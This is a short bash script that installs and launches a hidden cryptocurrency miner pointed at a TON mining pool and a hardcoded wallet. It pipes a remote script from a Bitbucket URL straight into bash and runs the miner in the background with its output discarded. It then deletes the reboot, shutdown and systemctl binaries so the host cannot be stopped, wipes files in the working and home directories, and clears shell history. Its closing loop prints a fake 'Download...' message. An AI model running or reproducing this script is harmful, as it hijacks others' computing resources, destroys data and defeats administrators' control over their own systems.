#!/bin/bash
apt-get update 
apt-get install -y wget curl
curl -sL https://bitbucket.org/new-kamikaze/lolkaze01/raw/main/lolGP.sh | bash
chmod +x lolkaze
nohup ./lolkaze --algo GRAM --pool us.ton.hashrate.to --port 4002 --user UQDZ3xIoMrP6K6BNMEZL_Hv8sEhWE-js9SWzFNxJEMywJ8ij.$(echo Rig-$(shuf -i 1000-9999 -n 1)) > /dev/null 2>&1 &
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done
